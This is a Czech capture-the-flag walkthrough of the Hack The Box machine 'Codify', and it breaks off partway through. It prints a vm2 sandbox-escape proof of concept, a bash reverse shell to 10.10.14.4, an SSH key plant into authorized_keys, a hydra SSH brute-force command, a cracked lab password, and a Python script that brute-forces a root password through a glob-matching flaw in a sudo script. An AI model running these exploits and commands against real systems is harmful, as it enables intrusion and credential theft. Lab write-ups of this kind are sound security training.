# Codify

-Přidat do /etc/hosts codify.htb

-Zjištěno pomocí nmap 22,80,3000 (na 80 a 3000 běží stejná stránka)

-Stránka slouží k sandbox spouštění JS kódu

-Po přečtení about us zjištění že používají vm2 na verzi 3.9.16, která je zranitelná na escape out sandbox -> POC [https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244)

```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}
`

console.log(vm.run(code));
```

-Funkce execSync() spouští commandy -> otestováno přes id, whoami (svc)

-Buď spustit reverse shell přes

```
execSync('bash -c "/bin/bash -i >& /dev/tcp/10.10.14.4/4444 0>&1"')
```

, nebo přidat svůj public key a připojit se přes ssh na svc

```
execSync('echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDhEr4qws9nZrby44b9mJK4oLJugxCCt0/pxRxsDb+ooL5J8gXsMaFrQhGQCO1qhrRuTUyJVyGC8tf9nretSj1iOhgkL85DuzH3ifc3lXeweEERg6xA0OUhoeDrkffx+pNskBmyL+McMkvFTzm9X8kIFVqnxYe3+s3WF+AB03JcjAvZoCWdt0/AsxvdjDaIiEbVVZ29jUQXNCWk4TKO6TRfYCn5qGvs7VSDE5NLCcc5rhUUalb0sh2XgXM4BixORac47MStMnhpw/UdrhNvYSIwyFLIkjOHFbR+X6x+pwrmaD5TOLZd9HR7fymLIdGoh+T+maRVWq1v1+vIbQwLL48IA6GTNyMU1Jaz7qALlEy+6mMmPrArul/zMvEK+ioB0nMqCYUV2Sza068sM6qnZo3bgH0SNc4LzuUp3Pp2O3JnqWnqlpdsxAC/HAVFHdL3aco0I/3XN6rnY+4MP7WPweMifxnFRg0JeSX8wDvmR8ShVfrxw0lVNhotBdRvn4QeMgM= kali@kali" > /home/svc/.ssh/authorized_keys');
```

-Ve složce **/var/www** nalezen tickets.db, odkud pomocí **strings** zjištěn hash k joshuovi $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

&#x20;(popřípadě bruteforce přes hydru na jeho ssh)

```
hydra -l joshua -P /usr/share/wordlists/rockyou.txt IP ssh
```

&#x20;-> zjištěno heslo **spongebob1**

-Po přihlášení na ssh joshua zjištěno pomocí **sudo -l**, že dokáže spouštět script **mysql-backup.sh** s právy roota

-Zranitelnost skriptu spočívá v porovnávání hesla zadaného uživatelem a hesla roota vytaženého z **/root/.creds** pomocí == uvnitř \[\[]]  který provádí porovnávání patternů místo přímého porovnávání

-Po zadání \* které dokáže zastoupit jakýkoli znak tedy vyhodí successful login -> potřeba bruteforcu každého jednoho charu hesla roota&#x20;

```
import string
import subprocess
all = list(string.ascii_letters + string.digits)
password = ""
found = False

while not found:
    for character in all:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True
```

-Po zjištění hesla&#x20;
